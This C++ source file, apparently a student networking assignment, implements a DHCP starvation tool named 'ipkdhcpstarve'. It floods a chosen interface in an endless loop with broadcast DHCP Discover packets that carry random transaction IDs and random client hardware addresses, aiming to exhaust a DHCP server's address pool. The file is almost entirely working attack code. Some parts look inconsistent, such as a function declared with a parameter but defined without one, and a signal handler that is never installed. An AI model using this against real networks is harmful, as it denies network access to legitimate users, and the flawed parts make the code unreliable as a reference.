
// C
#include <cstdlib>
#include <errno.h>
#include <signal.h>
#include <cstring>
#include <unistd.h>
// C++
#include <iostream>
#include <string>
// net
#include <arpa/inet.h>
#include <linux/if.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <netinet/ether.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <sys/ioctl.h>

#include "defs.h"

using namespace std;

/** @brief SIGINT handler. */
void sigint(int);


/* ----- DATA ----- */
char * ifce;
u_int32_t xid;         /**< Transaction ID. */
in_addr_t yiaddr; /**< Assigned address. */
/* ---------------- */

/**
 * @brief Creates socket.
 * @param ifce      Interface name.
 */
Socket createSocket(char * ifce);
/**
 * @brief Sends broadcast DHCP Discover packet.
 */
void send_DHCP_DISCOVER();


/**
 * @brief Main function.
 */
int main(int argc, char *argv[])
{
    // argument processing
    if(argc != 3 || string(argv[1]) != "-i")
    { cerr << "Usage: ./ipkdhcpstarve -i <interface>\n"; exit(ARG_ERR); }
    ifce = argv[2];

    srand(time(NULL)); // sets rand()

    // DHCP communication
    while(true) {
        send_DHCP_DISCOVER();       // send DHCP Discover
    }
    return 0;
}

Socket createSocket()
{
    Socket sock = Socket();

    //  create socket
    if(!sock.opened()) { cerr << "socket() failed.\n"; exit(SOCK_ERR); } 
    else { cerr << "socket() succeeded.\n"; }

    // sets debug
    if(!sock.set(SO_DEBUG)) 
    { cerr << "setsockopt(SO_DEBUG) failed.\n"; exit(SOCK_ERR); } 
    else { cerr << "setsockopt(SOL_DEBUG) succeeded.\n"; }

    // sets reuse address
    if(!sock.set(SO_REUSEADDR)) 
    { cerr << "setsockopt(SO_REUSEADDR) failed.\n"; exit(SOCK_ERR); } 
    else { cerr << "setsockopt(SOL_REUSEADDR) succeeded.\n"; }

    // sets broadcast
    if(!sock.set(SO_BROADCAST)) 
    { cerr << "setsockopt(SO_BROADCAST) failed.\n"; exit(SOCK_ERR); } 
    else { cerr << "setsockopt(SOL_BROADCAST) succeeded.\n"; }

    // sets socket to device
    if(setsockopt(sock, SOL_SOCKET, SO_BINDTODEVICE, ifce, strlen(ifce)) < 0)
    { cerr << "setsockopt(SO_BINDTODEVICE) failed.\n"; exit(SOCK_ERR); } 
    else { cerr << "setsockopt(SO_BINDTODEVICE) succeeded.\n"; }

    return sock;
}

void send_DHCP_DISCOVER()
{
    Socket sock = createSocket();
    DHCPPacket dhcp;
    
    /* --------- DHCP -------- */
    dhcp.op = DHCPDISCOVER; // msg type
    dhcp.xid = xid = rand(); // transaction id
    dhcp.ciaddr = inet_addr("0.0.0.0"); // client ip
    dhcp.yiaddr = inet_addr("0.0.0.0"); // client ip
    dhcp.siaddr = inet_addr("0.0.0.0"); // ip of next server to talk to
    dhcp.giaddr = inet_addr("0.0.0.0"); // ip of dhcp relay agent
    dhcp.chaddr[0] = rand(); // random mac addr
    dhcp.chaddr[1] = rand();
    dhcp.chaddr[2] = rand();
    dhcp.chaddr[3] = rand();
    dhcp.opt[0] = 0x63; // magic cookie
    dhcp.opt[1] = 0x82;
    dhcp.opt[2] = 0x53;
    dhcp.opt[3] = 0x63;
    dhcp.opt[4] = 53;
    dhcp.opt[5] = 0x01;
    dhcp.opt[6] = 0x01;
    dhcp.opt[7] = 0xFF;
    /* ----------------------- */
    
    /* ----- address ----- */
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr("255.255.255.255");
    addr.sin_port = htons(67);
    /* ------------------ */

    int b;
    if((b = sendto(sock, &dhcp, sizeof(dhcp), 0, (struct sockaddr *)&addr, sizeof(addr))) < 0)
    { cerr << "sendto() failed.\n"; exit(SOCK_ERR); }
    else { cerr << "sendto() succeeded.\n"; }
}

void sigint(int) { exit(0); }